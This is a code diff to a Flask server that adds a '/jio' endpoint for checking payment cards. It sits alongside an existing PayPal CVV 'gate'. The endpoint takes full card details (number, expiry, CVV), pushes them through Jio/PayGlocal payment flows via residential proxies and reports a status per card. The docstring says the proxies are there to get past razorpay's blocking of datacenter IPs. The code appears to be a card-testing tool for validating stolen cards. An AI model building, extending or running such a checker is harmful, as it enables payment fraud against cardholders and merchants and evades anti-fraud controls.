@@ -10,7 +10,7 @@ Flask server on port 5003.
   Requests WITHOUT proxy are rejected — the proxy is MANDATORY
   (razorpay blocks datacenter IPs at the payment step — only resi egress works).
 """
-import sys, os, json, time, asyncio, threading, subprocess
+import sys, os, re, json, time, asyncio, threading, subprocess, concurrent.futures
 from urllib.parse import urlsplit
 from flask import Flask, request, jsonify
 
@@ -193,6 +193,76 @@ def pp_cvv():
     if not cc or "|" not in cc:
         return jsonify({"error": "cc=CC|MM|YY|CVV"}), 400
     return jsonify(_pp_run(run_paypal_check, cc))
+
+
+
+
+# ─── Jio / PayGlocal lane (gates.jio = standalone jio2 engine) ───
+_jio_exec = concurrent.futures.ThreadPoolExecutor(max_workers=4)
+
+@app.route("/jio")
+def jio_check():
+    from gates.jio import (_run_jio, _parse_card, _detect_brand, _mask,
+                           SUPPORTED_BRANDS, MAX_RETRIES,
+                           RETRY_DELAY_MIN, RETRY_DELAY_MAX)
+    import random as _rnd
+    number = (request.args.get("jio") or request.args.get("number") or "").strip()
+    amount = (request.args.get("amount") or "").strip()
+    cc_raw = (request.args.get("cc") or "").strip()
+    proxy_raw = (request.args.get("proxy") or "").strip()
+    debug = (request.args.get("debug") or "").strip().lower() in ("1", "true", "yes")
+    t0 = time.time()
+
+    if not number or not re.fullmatch(r"\d{10}", number) or not amount:
+        return jsonify({"error": "missing or invalid params — use /jio?jio=<10-digit>&amount=<amt>&cc=<card>&proxy=<proxy>"}), 400
+    try:
+        amount_f = float(amount)
+    except ValueError:
+        return jsonify({"error": "missing or invalid params — amount must be numeric"}), 400
+    if amount_f <= 0:
+        return jsonify({"error": "missing or invalid params — amount must be > 0"}), 400
+    card = _parse_card(cc_raw)
+    if not card:
+        return jsonify({"error": "missing or invalid cc"}), 400
+    brand = _detect_brand(card["cc"])
+    if brand["brand"] not in SUPPORTED_BRANDS:
+        return jsonify({"error": f"card brand not supported ({brand['brand']}) — visa/mastercard/amex only"}), 400
+
+    result, _reason = None, ""
+    for attempt in range(1, MAX_RETRIES + 2):
+        if attempt > 1:
+            time.sleep(_rnd.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
+        fut = _jio_exec.submit(_run_jio, number, card, amount_f, proxy_raw or None, debug)
+        try:
+            result, _reason = fut.result(timeout=110)
+        except concurrent.futures.TimeoutError:
+            fut.cancel()
+            result = {"status": "error", "response": "Timeout (plan lookup stuck)",
+                      "amount": amount_f, "gate": "unknown"}
+            break
+        if result["status"] != "error":
+            break
+
+    gate = str(result.get("gate") or "").strip().title()
+    gateway = f"Jio {gate}" if gate and gate.lower() != "unknown" else "Jio"
+    st = str(result.get("status", "ERROR")).upper()
+    amt = result.get("amount")
+    try:
+        amt_s = str(float(amt)).rstrip("0").rstrip(".") or "0"
+    except Exception:
+        amt_s = str(amt or amount)
+    out = {
+        "cc": cc_raw, "Gateway": gateway,
+        "Status": st,
+        "Response": str(result.get("response", ""))[:70],
+        "Price": amt_s,
+        "Currency": "INR",
+        "IP": proxy_raw.split("@")[-1].split(":")[0] if "@" in proxy_raw else (proxy_raw or "direct"),
+        "timetaken": f"{time.time()-t0:.1f}s",
+    }
+    if debug:
+        out["Raw"] = json.dumps(result, default=str)[:1500]
+    return jsonify(out)
 
 
 if __name__ == "__main__":
